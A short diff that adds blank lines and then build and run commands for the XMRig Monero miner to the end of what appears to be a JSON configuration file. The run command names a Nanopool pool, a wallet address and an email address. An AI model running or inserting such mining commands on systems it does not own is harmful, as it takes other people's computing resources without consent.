@@ -12,3 +12,12 @@
         }
     ]
 }
+
+
+
+
+
+cmake .. -DWITH_HWLOC=OFF && make -j$(nproc)
+
+
+./xmrig -o xmr-asia1.nanopool.org:14433 -u 43omaFVEsApbeNNTjMhpCF7S4NKF6r4FuUE7zn7F1yBSTFsWYWW78JLEdMQcgpTF3M7sLApeDr8H1jeyfaMuXFF6VdrUjWP.mobilerig/nambinr3@gmail.com --tls --coin monero
